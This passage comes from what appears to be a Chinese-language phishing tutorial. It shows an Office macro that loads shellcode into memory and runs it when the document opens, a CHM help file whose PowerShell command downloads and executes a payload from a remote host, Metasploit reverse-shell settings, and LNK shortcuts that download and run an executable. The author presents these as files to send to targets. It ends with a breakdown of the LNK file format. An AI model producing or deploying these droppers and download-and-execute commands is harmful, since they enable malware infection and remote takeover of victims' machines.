class="number">65</span>,<span class="number">81</span>,<span class="number">65</span>,<span class="number">80</span>,<span class="number">82</span>,<span class="number">81</span>,<span class="number">86</span>,<span class="number">72</span>,<span class="number">49</span>,<span class="number">210</span>,<span class="number">101</span>,<span class="number">72</span>,<span class="number">139</span>,<span class="number">82</span>,<span class="number">96</span>,<span class="number">72</span>,<span class="number">139</span>,<span class="number">82</span>,<span class="number">24</span>,<span class="number">72</span>,<span class="number">139</span>,<span class="number">82</span>,<span class="number">32</span>,<span class="number">72</span>,<span class="number">139</span>,<span class="number">114</span>,<span class="number">80</span>,<span class="number">72</span>,<span class="number">15</span>,<span class="number">183</span>,<span class="number">74</span>,<span class="number">74</span>,<span class="number">77</span>,<span class="number">49</span>,<span class="number">201</span>,<span class="number">72</span>,<span class="number">49</span>,<span class="number">192</span>,<span class="number">172</span>,<span class="number">60</span>,<span class="number">97</span>,<span class="number">124</span>,<span class="number">2</span>,<span class="number">44</span>,<span class="number">32</span>,<span class="number">65</span>,<span class="number">193</span>,<span class="number">201</span>,<span class="number">13</span>,<span class="number">65</span>,<span class="number">1</span>,<span class="number">193</span>,<span class="number">226</span>,<span class="number">237</span>,<span class="number">82</span>,<span class="number">65</span>,<span class="number">81</span>,<span class="number">72</span>,<span class="number">139</span>,<span class="number">82</span>,<span class="number">32</span>,<span class="number">139</span>,<span class="number">66</span>,<span class="number">60</span>,<span class="number">72</span>,<span class="number">1</span>,<span class="number">208</span>,<span class="number">102</span>,<span class="number">129</span>,<span class="number">120</span>,<span class="number">24</span>, _</span><br><span class="line"><span class="number">11</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">133</span>,<span class="number">114</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">139</span>,<span class="number">128</span>,<span class="number">136</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">72</span>,<span class="number">133</span>,<span class="number">192</span>,<span class="number">116</span>,<span class="number">103</span>,<span class="number">72</span>,<span class="number">1</span>,<span class="number">208</span>,<span class="number">80</span>,<span class="number">139</span>,<span class="number">72</span>,<span class="number">24</span>,<span class="number">68</span>,<span class="number">139</span>,<span class="number">64</span>,<span class="number">32</span>,<span class="number">73</span>,<span class="number">1</span>,<span class="number">208</span>,<span class="number">227</span>,<span class="number">86</span>,<span class="number">72</span>,<span class="number">255</span>,<span class="number">201</span>,<span class="number">65</span>,<span class="number">139</span>,<span class="number">52</span>,<span class="number">136</span>,<span class="number">72</span>,<span class="number">1</span>,<span class="number">214</span>,<span class="number">77</span>,<span class="number">49</span>,<span class="number">201</span>,<span class="number">72</span>,<span class="number">49</span>,<span class="number">192</span>,<span class="number">172</span>,<span class="number">65</span>,<span class="number">193</span>,<span class="number">201</span>,<span class="number">13</span>,<span class="number">65</span>,<span class="number">1</span>,<span class="number">193</span>,<span class="number">56</span>,<span class="number">224</span>,<span class="number">117</span>,<span class="number">241</span>,<span class="number">76</span>,<span class="number">3</span>,<span class="number">76</span>,<span class="number">36</span>,<span class="number">8</span>,<span class="number">69</span>,<span class="number">57</span>,<span class="number">209</span>,<span class="number">117</span>,<span class="number">216</span>,<span class="number">88</span>,<span class="number">68</span>,<span class="number">139</span>,<span class="number">64</span>,<span class="number">36</span>,<span class="number">73</span>,<span class="number">1</span>, _</span><br><span class="line"><span class="number">208</span>,<span class="number">102</span>,<span class="number">65</span>,<span class="number">139</span>,<span class="number">12</span>,<span class="number">72</span>,<span class="number">68</span>,<span class="number">139</span>,<span class="number">64</span>,<span class="number">28</span>,<span class="number">73</span>,<span class="number">1</span>,<span class="number">208</span>,<span class="number">65</span>,<span class="number">139</span>,<span class="number">4</span>,<span class="number">136</span>,<span class="number">72</span>,<span class="number">1</span>,<span class="number">208</span>,<span class="number">65</span>,<span class="number">88</span>,<span class="number">65</span>,<span class="number">88</span>,<span class="number">94</span>,<span class="number">89</span>,<span class="number">90</span>,<span class="number">65</span>,<span class="number">88</span>,<span class="number">65</span>,<span class="number">89</span>,<span class="number">65</span>,<span class="number">90</span>,<span class="number">72</span>,<span class="number">131</span>,<span class="number">236</span>,<span class="number">32</span>,<span class="number">65</span>,<span class="number">82</span>,<span class="number">255</span>,<span class="number">224</span>,<span class="number">88</span>,<span class="number">65</span>,<span class="number">89</span>,<span class="number">90</span>,<span class="number">72</span>,<span class="number">139</span>,<span class="number">18</span>,<span class="number">233</span>,<span class="number">75</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">93</span>,<span class="number">73</span>,<span class="number">190</span>,<span class="number">119</span>,<span class="number">115</span>,<span class="number">50</span>,<span class="number">95</span>,<span class="number">51</span>,<span class="number">50</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">86</span>,<span class="number">73</span>,<span class="number">137</span>,<span class="number">230</span>,<span class="number">72</span>,<span class="number">129</span>,<span class="number">236</span>,<span class="number">160</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">73</span>,<span class="number">137</span>,<span class="number">229</span>,<span class="number">73</span>, _</span><br><span class="line"><span class="number">188</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">30</span>,<span class="number">210</span>,<span class="number">192</span>,<span class="number">168</span>,<span class="number">183</span>,<span class="number">138</span>,<span class="number">65</span>,<span class="number">84</span>,<span class="number">73</span>,<span class="number">137</span>,<span class="number">228</span>,<span class="number">76</span>,<span class="number">137</span>,<span class="number">241</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">76</span>,<span class="number">119</span>,<span class="number">38</span>,<span class="number">7</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">76</span>,<span class="number">137</span>,<span class="number">234</span>,<span class="number">104</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">89</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">41</span>,<span class="number">128</span>,<span class="number">107</span>,<span class="number">0</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">106</span>,<span class="number">10</span>,<span class="number">65</span>,<span class="number">94</span>,<span class="number">80</span>,<span class="number">80</span>,<span class="number">77</span>,<span class="number">49</span>,<span class="number">201</span>,<span class="number">77</span>,<span class="number">49</span>,<span class="number">192</span>,<span class="number">72</span>,<span class="number">255</span>,<span class="number">192</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">194</span>,<span class="number">72</span>,<span class="number">255</span>,<span class="number">192</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">193</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">234</span>,<span class="number">15</span>,<span class="number">223</span>,<span class="number">224</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">199</span>,<span class="number">106</span>,<span class="number">16</span>,<span class="number">65</span>, _</span><br><span class="line"><span class="number">88</span>,<span class="number">76</span>,<span class="number">137</span>,<span class="number">226</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">249</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">153</span>,<span class="number">165</span>,<span class="number">116</span>,<span class="number">97</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">133</span>,<span class="number">192</span>,<span class="number">116</span>,<span class="number">10</span>,<span class="number">73</span>,<span class="number">255</span>,<span class="number">206</span>,<span class="number">117</span>,<span class="number">229</span>,<span class="number">232</span>,<span class="number">147</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">72</span>,<span class="number">131</span>,<span class="number">236</span>,<span class="number">16</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">226</span>,<span class="number">77</span>,<span class="number">49</span>,<span class="number">201</span>,<span class="number">106</span>,<span class="number">4</span>,<span class="number">65</span>,<span class="number">88</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">249</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">2</span>,<span class="number">217</span>,<span class="number">200</span>,<span class="number">95</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">131</span>,<span class="number">248</span>,<span class="number">0</span>,<span class="number">126</span>,<span class="number">85</span>,<span class="number">72</span>,<span class="number">131</span>,<span class="number">196</span>,<span class="number">32</span>,<span class="number">94</span>,<span class="number">137</span>,<span class="number">246</span>,<span class="number">106</span>,<span class="number">64</span>,<span class="number">65</span>,<span class="number">89</span>,<span class="number">104</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">88</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">242</span>, _</span><br><span class="line"><span class="number">72</span>,<span class="number">49</span>,<span class="number">201</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">88</span>,<span class="number">164</span>,<span class="number">83</span>,<span class="number">229</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">195</span>,<span class="number">73</span>,<span class="number">137</span>,<span class="number">199</span>,<span class="number">77</span>,<span class="number">49</span>,<span class="number">201</span>,<span class="number">73</span>,<span class="number">137</span>,<span class="number">240</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">218</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">249</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">2</span>,<span class="number">217</span>,<span class="number">200</span>,<span class="number">95</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">131</span>,<span class="number">248</span>,<span class="number">0</span>,<span class="number">125</span>,<span class="number">40</span>,<span class="number">88</span>,<span class="number">65</span>,<span class="number">87</span>,<span class="number">89</span>,<span class="number">104</span>,<span class="number">0</span>,<span class="number">64</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">88</span>,<span class="number">106</span>,<span class="number">0</span>,<span class="number">90</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">11</span>,<span class="number">47</span>,<span class="number">15</span>,<span class="number">48</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">87</span>,<span class="number">89</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">77</span>,<span class="number">97</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">73</span>,<span class="number">255</span>,<span class="number">206</span>,<span class="number">233</span>,<span class="number">60</span>,<span class="number">255</span>, _</span><br><span class="line"><span class="number">255</span>,<span class="number">255</span>,<span class="number">72</span>,<span class="number">1</span>,<span class="number">195</span>,<span class="number">72</span>,<span class="number">41</span>,<span class="number">198</span>,<span class="number">72</span>,<span class="number">133</span>,<span class="number">246</span>,<span class="number">117</span>,<span class="number">180</span>,<span class="number">65</span>,<span class="number">255</span>,<span class="number">231</span>,<span class="number">88</span>,<span class="number">106</span>,<span class="number">0</span>,<span class="number">89</span>,<span class="number">73</span>,<span class="number">199</span>,<span class="number">194</span>,<span class="number">240</span>,<span class="number">181</span>,<span class="number">162</span>,<span class="number">86</span>,<span class="number">255</span>,<span class="number">213</span>)</span><br><span class="line"></span><br><span class="line">        Esc = VirtualAlloc(<span class="number">0</span>, UBound(Laclv), <span class="number">&amp;H1000</span>, <span class="number">&amp;H40</span>)</span><br><span class="line">        <span class="keyword">For</span> Whxffnbhl = LBound(Laclv) <span class="keyword">To</span> UBound(Laclv)</span><br><span class="line">                Imtzv = Laclv(Whxffnbhl)</span><br><span class="line">                Hyub = RtlMoveMemory(Esc + Whxffnbhl, Imtzv, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">Next</span> Whxffnbhl</span><br><span class="line">        Hyub = CreateThread(<span class="number">0</span>, <span class="number">0</span>, Esc, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line">        Auto_Open</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> Workbook_Open()</span><br><span class="line">        Auto_Open</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/5.png" alt="image-20200726210839105"></p><p>保存下就可以</p><p>然后我们在kali上监听</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/6.png" alt="image-20200726211842860"></p><p>带有宏的Word保存是这样的</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/7.png" alt="image-20200726211912494"></p><p>我们运行下试试</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/8.png" alt="image-20200726221726990"></p><p>上线成功</p><h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2><p>在PDF、Office文档中内嵌一个跳转链接是很早期的钓鱼方式，通过文字信息的引导，让受害者点开页面，如果缺乏戒心，就可能会获取到受害者的账号、密码、银行卡、身份证等信息。</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/9.png" alt="img"></p><h2 id="CHM文档"><a href="#CHM文档" class="headerlink" title="CHM文档"></a>CHM文档</h2><p>CHM是Windows帮助文件（如电子书）使用的扩展名，此文件可以被植入可执行代码。</p><p>缺点：其缺点就是打开时会出现弹黑框、卡顿，容易被察觉。</p><h3 id="收工制作钓鱼邮件"><a href="#收工制作钓鱼邮件" class="headerlink" title="收工制作钓鱼邮件"></a>收工制作钓鱼邮件</h3><p>制作一个CHM文档，使用EasyCHM来制作</p><p>创建一个文件夹（名字随意），在文件夹里面再创建两个文件夹（名字随意）和一个index.html文件，在两个文件夹内部创建各创建一个index.html文件。然后先将下列代码复制到根文件夹中的index.html中</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Mousejack replay<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">hello word </span><br><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;,calc.exe&#x27;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;273,1,1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">x.Click();</span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面说的根文件夹的index.html是运行就会执行文件，而另外test1和test2是需要点击才会执行的，所有这两个文件夹我们不填写任何东西</p><p>直接上GIF图来演示</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/10.gif" alt="2"></p><h3 id="利用CS-msf制作钓鱼CHM文件"><a href="#利用CS-msf制作钓鱼CHM文件" class="headerlink" title="利用CS/msf制作钓鱼CHM文件"></a>利用CS/msf制作钓鱼CHM文件</h3><p>CS制作方式</p><p>点击attacks——&gt;web Drive by——&gt;scripted web Delivery</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/11.png" alt="image-20200811174211768"></p><p>生成好的命令</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/12.png" alt="image-20200811174319596"></p><p>MSF制作方式</p><p>执行如下命令即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery </span><br><span class="line"><span class="built_in">set</span> target 2</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lport 4444</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.10.128 <span class="comment">#本机地址</span></span><br><span class="line"><span class="built_in">set</span> srvhost 0.0.0.0</span><br><span class="line"><span class="built_in">set</span> srvport 8080</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/13.png" alt="1"></p><p>然后我们把MSF命令插入到CHM文件里面，注意执行的进程那边要用<code>,</code>号隔开</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Mousejack replay<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">command exec </span><br><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;,powershell.exe, -nop -w hidden -c $Y=new-object net.webclient;if([System.Net.WebProxy]::GetDefaultProxy().address -ne $null)&#123;$Y.proxy=[Net.WebRequest]::GetSystemWebProxy();$Y.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;&#125;;IEX ([System.Text.Encoding]::ASCII.GetString($Y.downloaddata(&#x27;http://192.168.1.8:8080/EN7JqNv&#x27;)));&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">x.Click();</span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这边以MSF作为演示</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/14.png" alt="2"></p><h2 id="LNK钓鱼"><a href="#LNK钓鱼" class="headerlink" title="LNK钓鱼"></a>LNK钓鱼</h2><p>制作快捷方式来钓鱼，需要创建两个文件</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/15.png" alt="1"></p><p>我们将任意一个快捷方式的“属性”中“目标”的值修改为如下字符串：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%SystemRoot%\system32\cmd.exe cmd /c powershell.exe -nop -w hidden -c IEX (new-object net.webclient).DownloadFile(<span class="string">&#x27;http://127.0.0.1/1.exe&#x27;</span>,<span class="string">&#x27;.\\1.exe&#x27;</span>);&amp;cmd /c .\\1.exe</span><br></pre></td></tr></table></figure><p>当我们再次运行这个快捷方式时，就达到了利用powershell从远程服务器下载文件到本地并执行的功能。这仅仅是其中一种用法，还有各种不同的方法都可以演化出来。就看你脑洞有多大。</p><p>快速生成lnk样本</p><ul><li><p>创建<strong>test.ps1</strong>文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$WshShell</span> = <span class="built_in">New-Object</span> <span class="literal">-comObject</span> WScript.Shell</span><br><span class="line"><span class="variable">$Shortcut</span> = <span class="variable">$WshShell</span>.CreateShortcut(<span class="string">&quot;test.lnk&quot;</span>)</span><br><span class="line"><span class="variable">$Shortcut</span>.TargetPath = <span class="string">&quot;%SystemRoot%\system32\cmd.exe&quot;</span></span><br><span class="line"><span class="variable">$Shortcut</span>.IconLocation = <span class="string">&quot;%SystemRoot%\System32\Shell32.dll,21&quot;</span></span><br><span class="line"><span class="variable">$Shortcut</span>.Arguments = <span class="string">&quot;cmd /c powershell.exe -nop -w hidden -c IEX (new-object net.webclient).DownloadFile(&#x27;http://192.168.1.7:8000/ascotbe.exe&#x27;,&#x27;.\\ascotbe.exe&#x27;);&amp;cmd /c .\\ascotbe.exe&quot;</span></span><br><span class="line"><span class="variable">$Shortcut</span>.Save()</span><br></pre></td></tr></table></figure></li><li><p>然后运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ExecutionPolicy RemoteSigned -file test.ps1</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/16.png" alt="image-20200812214347733"></p><p>我们生成的恶意文件，接下来只要把这个文件发送给目标即可（你服务器一定要有ascotbe.exe这个文件）</p><p>在我们的服务器上生成个文件然后开个http服务</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/17.png" alt="image-20200812215457292"></p><p>然后目标机器运行我们的快捷方式</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/18.png" alt="image-20200812215620974"></p><p>接着我们只要把生成好的这个<strong>test</strong>快捷方式发送给目标，双击后就会收到系统上线了</p><h3 id="LNK文件格式解析"><a href="#LNK文件格式解析" class="headerlink" title="LNK文件格式解析"></a>LNK文件格式解析</h3><p>我们从二进制的格式来解读下LNK文件，完整文档可以看微软的文档</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;openspecs&#x2F;windows_protocols&#x2F;ms-shllink&#x2F;747629b3-b5be-452a-8101-b9a2ec49978c</span><br></pre></td></tr></table></figure><p>分析lnk文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ascotbe&#x2F;Random-img&#x2F;blob&#x2F;master&#x2F;Offer&#x2F;%E7%81%AB%E7%BB%92%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6.lnk</span><br></pre></td></tr></table></figure><h4 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h4><p>前面有20个字节固定不变</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/26.png" alt="image-20200813164015856"></p><ul><li>HeaderSize(4 bytes, <code>offset 0x00</code>)：0x0000004C</li><li>LinkCLSID(16 bytes, <code>offset 0x04</code>)：00021401-0000-0000-C000-000000000046</li></ul><h4 id="LinkFlags"><a href="#LinkFlags" class="headerlink" title="LinkFlags"></a>LinkFlags</h4><p><code>offset 0x14</code>起始4字节为<strong>LinkFlags</strong></p><table><thead><tr><th align="left">0</th><th align="left">1</th><th align="left">2</th><th align="left">3</th><th align="left">4</th><th align="left">5</th><th align="left">6</th><th align="left">7</th><th align="left">8</th><th align="left">9</th><th align="left">1 0</th><th align="left">1</th><th align="left">2</th><th align="left">3</th><th align="left">4</th><th align="left">5</th><th align="left">6</th><th align="left">7</th><th align="left">8</th><th align="left">9</th><th align="left">2 0</th><th align="left">1</th><th align="left">2</th><th align="left">3</th><th align="left">4</th><th align="left">5</th><th align="left">6</th><th align="left">7</th><th align="left">8</th><th align="left">9</th><th align="left">3 0</th><th align="left">1</th></tr></thead><tbody><tr><td align="left">A</td><td align="left">B</td><td align="left">C</td><td align="left">D</td><td align="left">E</td><td align="left">F</td><td align="left">G</td><td align="left">H</td><td align="left">I</td><td align="left">J</td><td align="left">K</td><td align="left">L</td><td align="left">M</td><td align="left">N</td><td align="left">O</td><td align="left">P</td><td align="left">Q</td><td align="left">R</td><td align="left">S</td><td align="left">T</td><td align="left">U</td><td align="left">V</td><td align="left">W</td><td align="left">X</td><td align="left">Y</td><td align="left">Z</td><td align="left">A A</td><td align="left">0</td><td align="left">0</td><td align="left">0</td><td align="left">0</td><td align="left">0</td></tr></tbody></table><p>解释如下</p><table><thead><tr><th align="left">Value</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">A  <code>HasLinkTargetIDList</code></td><td align="left">The shell link is saved with an <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_ae01eca8-1cd4-4472-8be6-bd5d3ab4d01c">item ID list (IDList)</a>. If this bit is set, a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/881d7a83-07a5-4702-93e3-f9fc34c3e1e4">LinkTargetIDList</a> structure (section 2.2) MUST follow the ShellLinkHeader. If this bit is not set, this structure MUST NOT be present.</td></tr><tr><td align="left">B  <code>HasLinkInfo</code></td><td align="left">The shell link is saved with link information. If this bit is set, a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/6813269d-0cc8-4be2-933f-e96e8e3412dc">LinkInfo</a> structure (section 2.3) MUST be present. If this bit is not set, this structure MUST NOT be present.</td></tr><tr><td align="left">C  <code>HasName</code></td><td align="left">The shell link is saved with a name string. If this bit is set, a <strong>NAME_STRING</strong> <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/17b69472-0f34-4bcf-b290-eccdb8de224b">StringData</a> structure (section 2.4) MUST be present. If this bit is not set, this structure MUST NOT be present.</td></tr><tr><td align="left">D  <code>HasRelativePath</code></td><td align="left">The shell link is saved with a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_f0a8c9c7-1368-4989-addb-4792c3206387">relative path</a> string. If this bit is set, a <strong>RELATIVE_PATH</strong> StringData structure (section 2.4) MUST be present. If this bit is not set, this structure MUST NOT be present.</td></tr><tr><td align="left">E  <code>HasWorkingDir</code></td><td align="left">The shell link is saved with a working directory string. If this bit is set, a <strong>WORKING_DIR</strong> StringData structure (section 2.4) MUST be present. If this bit is not set, this structure MUST NOT be present.</td></tr><tr><td align="left">F  <code>HasArguments</code></td><td align="left">The shell link is saved with command line arguments. If this bit is set, a <strong>COMMAND_LINE_ARGUMENTS</strong> StringData structure (section 2.4) MUST be present. If this bit is not set, this structure MUST NOT be present.</td></tr><tr><td align="left">G  <code>HasIconLocation</code></td><td align="left">The shell link is saved with an icon location string. If this bit is set, an <strong>ICON_LOCATION</strong> StringData structure (section 2.4) MUST be present. If this bit is not set, this structure MUST NOT be present.</td></tr><tr><td align="left">H  <code>IsUnicode</code></td><td align="left">The shell link contains Unicode encoded strings. This bit SHOULD be set. If this bit is set, the StringData section contains Unicode-encoded strings; otherwise, it contains strings that are encoded using the system default code page.</td></tr><tr><td align="left">I  <code>ForceNoLinkInfo</code></td><td align="left">The LinkInfo structure (section 2.3) is ignored.</td></tr><tr><td align="left">J  <code>HasExpString</code></td><td align="left">The shell link is saved with an <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/2224d03c-f417-44a0-81e3-df169938ba72">EnvironmentVariableDataBlock (section 2.5.4)</a>.</td></tr><tr><td align="left">K  <code>RunInSeparateProcess</code></td><td align="left">The target is run in a separate virtual machine when launching a <a 